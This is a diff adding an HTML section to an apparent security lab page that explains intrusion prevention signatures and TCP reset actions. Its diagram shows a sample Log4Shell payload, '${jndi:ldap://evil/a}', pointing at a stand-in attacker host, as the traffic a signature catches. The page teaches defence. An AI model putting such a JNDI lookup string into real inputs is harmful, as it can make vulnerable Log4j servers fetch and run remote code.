@@ -1,0 +1,19 @@
+<p><b>Intrusion Prevention (IPS)</b> inspects content for known exploit
+patterns -- the network equivalent of antivirus signatures, but for the
+attack traffic itself rather than files. A signature matches a specific,
+known vulnerability (usually tied to a CVE), and the action is typically
+more aggressive than a plain block: a TCP <b>reset</b> tears down the
+connection immediately rather than just silently dropping packets.</p>
+<p>Real IPS engines do far more than string matching -- protocol decoders,
+normalization, evasion handling -- but the core idea is the same one this
+lab's tiny signature set demonstrates.</p>
+<div class="diagram">
+  <div class="diagram-label">Signature match</div>
+  <div class="diagram-flow">
+    <div class="diagram-step"><div class="step-title">Payload</div><div class="step-sub">"...${jndi:ldap://evil/a}..."</div></div>
+    <div class="diagram-arrow">→</div>
+    <div class="diagram-step warn"><div class="step-title">Signature DB</div><div class="step-sub">CVE-2021-44228, Log4Shell</div></div>
+    <div class="diagram-arrow">→</div>
+    <div class="diagram-step bad"><div class="step-title">Reset</div><div class="step-sub">connection torn down immediately</div></div>
+  </div>
+</div>
